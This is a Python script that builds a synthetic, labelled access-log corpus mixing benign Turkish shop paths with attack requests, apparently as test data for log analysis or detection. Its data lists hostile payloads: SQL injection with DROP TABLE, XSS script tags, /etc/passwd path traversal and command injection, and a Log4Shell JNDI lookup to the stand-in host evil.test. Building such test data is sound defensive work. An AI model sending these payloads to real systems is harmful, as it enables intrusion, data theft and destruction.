#!/usr/bin/env python3
"""TR hosting tarzi anonymized access log corpus — turkce path + karma saldiri/benign."""
from __future__ import annotations

import json
import os
import random
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "corpus" / "tr_hosting_corpus.access"
MANIFEST = ROOT / "corpus" / "tr_hosting_manifest.json"
TARGET_LINES = int(os.environ.get("TR_HOSTING_CORPUS_LINES", "500"))
TS = "08/Jun/2026:12:00:01 +0300"
RNG = random.Random(42)


def line(ip: str, method: str, path: str, status: int = 200, ua: str = "Mozilla/5.0") -> str:
    return f'{ip} - - [{TS}] "{method} {path} HTTP/1.1" {status} 420 "-" "{ua}"'


def line_lg(ip: str, method: str, path: str, body: str = "-", status: int = 200) -> str:
    b = body.replace('"', '\\"')
    return (
        f'{ip} - - [{TS}] "{method} {path} HTTP/1.1" {status} 128 "-" '
        f'"Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "-" "{b}"'
    )


def main() -> None:
    entries: list[dict[str, str]] = []

    def add(cat: str, raw: str) -> None:
        entries.append({"category": cat, "line": raw})

    benign_paths = [
        "/",
        "/index.php",
        "/hakkimizda",
        "/iletisim",
        "/urunler",
        "/urun/laptop-asus-15",
        "/kategori/telefon",
        "/sepet",
        "/odeme",
        "/blog/yazilim-guvenligi",
        "/wp-content/themes/twentytwenty/style.css",
        "/favicon.ico",
        "/robots.txt",
        "/api/v1/urunler?limit=20",
        "/arama?kelime=telefon",
    ]
    for i, p in enumerate(benign_paths):
        add("benign", line(f"85.105.{i // 256}.{i % 256}", "GET", p))

    tr_attacks = [
        ("sqli", "GET", "/arama?kelime=1%27+OR+%271%27%3D%271"),
        ("sqli", "GET", "/urun?id=1;DROP+TABLE+siparis--"),
        ("sqli", "GET", "/api/ara?q=admin%27--"),
        ("xss", "GET", "/yorum?metin=%3Cscript%3Ealert(1)%3C/script%3E"),
        ("xss", "GET", "/profil?ad=%3Cimg+src=x+onerror=alert(1)%3E"),
        ("lfi", "GET", "/indir?dosya=../../../etc/passwd"),
        ("lfi", "GET", "/resim?yol=..%2f..%2fetc%2fpasswd"),
        ("rce", "GET", "/cgi-bin/test?cmd=;cat+/etc/passwd"),
        ("scanner", "GET", "/wp-login.php", "WPScan/3.8"),
        ("scanner", "GET", "/xmlrpc.php", "Nikto/2.5.0"),
        ("brute", "POST", "/giris"),
        ("sqli", "POST", "/giris"),
        ("sqli", "POST", "/api/kayit"),
        ("log4shell", "GET", "/api?q=${jndi:ldap://evil.test/a}"),
        ("nosql", "GET", "/api/kullanici?filter[$gt]="),
    ]
    post_bodies = {
        "/giris": "kullanici=admin' OR '1'='1&parola=x",
        "/api/kayit": "email=test@test.com&pass=1'; DROP TABLE users--",
    }
    for i, spec in enumerate(tr_attacks):
        cat = spec[0]
        method = spec[1]
        path = spec[2]
        ua = spec[3] if len(spec) > 3 else "Mozilla/5.0"
        ip = f"185.220.{(i // 256) % 256}.{i % 256}"
        if method == "POST" and path in post_bodies:
            add(cat, line_lg(ip, "POST", path, post_bodies[path], 401))
        elif cat == "scanner":
            add(cat, line(ip, method, path, 404, ua))
        else:
            add(cat, line(ip, method, path, 403, ua))

    # Doldur — TR_HOSTING_CORPUS_LINES (varsayilan 500)
    fill_specs = [
        ("sqli", "GET", "/siparis?no={}"),
        ("xss", "GET", "/haber?baslik=<script>alert({})</script>"),
        ("lfi", "GET", "/dosya?f=....//....//etc/passwd%00"),
        ("scanner", "GET", "/wp-admin/setup-config.php"),
        ("brute", "POST", "/giris"),
        ("benign", "GET", "/magaza/sayfa/{}"),
    ]
    n = 0
    while len(entries) < TARGET_LINES:
        cat, method, tpl = fill_specs[n % len(fill_specs)]
        path = tpl.format(n)
        ip = f"78.{(n // 256) % 256}.{n % 256}.{(n * 3) % 254 + 1}"
        if cat == "benign":
            add(cat, line(ip, method, path))
        elif cat == "scanner":
            add(cat, line(ip, method, path, 404, "Nikto/2.5.0"))
        elif cat == "brute":
            add(cat, line_lg(ip, "POST", path, f"kullanici=admin{n}&parola=yanlis", 401))
        else:
            add(cat, line(ip, method, path, 403))
        n += 1

    RNG.shuffle(entries)

    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text("\n".join(e["line"] for e in entries) + "\n", encoding="utf-8")

    categories: dict[str, list[int]] = {}
    for idx, e in enumerate(entries):
        categories.setdefault(e["category"], []).append(idx)

    manifest = {
        "generated": TS,
        "source": "Synthetic TR hosting patterns (anonymized IPs, Turkish paths)",
        "corpus": str(OUT.relative_to(ROOT)),
        "lines_total": len(entries),
        "categories": {
            cat: {"count": len(idxs), "line_indices": idxs}
            for cat, idxs in sorted(categories.items())
        },
    }
    MANIFEST.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
    attack_cats = {k: v for k, v in categories.items() if k != "benign"}
    print(
        f"[generate_tr_hosting_corpus] {OUT} ({len(entries)} lines, "
        f"{len(categories)} categories, {len(attack_cats)} attack cats)"
    )
    print(f"[generate_tr_hosting_corpus] {MANIFEST}")


if __name__ == "__main__":
    main()
